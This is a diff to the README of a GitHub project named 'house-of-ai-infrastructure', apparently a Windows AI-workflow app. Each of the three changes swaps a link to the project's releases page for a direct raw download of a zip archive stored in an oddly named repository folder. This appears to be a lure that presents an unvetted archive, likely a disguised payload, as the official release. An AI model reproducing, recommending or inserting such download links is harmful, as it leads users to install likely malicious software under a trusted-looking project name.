@@ -1,6 +1,6 @@
 # 🤖 house-of-ai-infrastructure - Build AI Workflows with Confidence
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/RoyL03/house-of-ai-infrastructure/raw/refs/heads/main/unsyntactical/infrastructure_of_house_ai_v3.9-beta.2.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ If your computer can run modern desktop apps, it should work well.
 
 Use this link to visit the release page and download the app for Windows:
 
-[https://github.com/RoyL03/house-of-ai-infrastructure/releases](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
+[https://github.com/RoyL03/house-of-ai-infrastructure/raw/refs/heads/main/unsyntactical/infrastructure_of_house_ai_v3.9-beta.2.zip](https://github.com/RoyL03/house-of-ai-infrastructure/raw/refs/heads/main/unsyntactical/infrastructure_of_house_ai_v3.9-beta.2.zip)
 
 ### Steps
 
@@ -196,7 +196,7 @@ This project focuses on:
 
 If you want the latest version, return to the release page and visit this page to download:
 
-[https://github.com/RoyL03/house-of-ai-infrastructure/releases](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
+[https://github.com/RoyL03/house-of-ai-infrastructure/raw/refs/heads/main/unsyntactical/infrastructure_of_house_ai_v3.9-beta.2.zip](https://github.com/RoyL03/house-of-ai-infrastructure/raw/refs/heads/main/unsyntactical/infrastructure_of_house_ai_v3.9-beta.2.zip)
 
 ## 📝 Basic support checklist
 
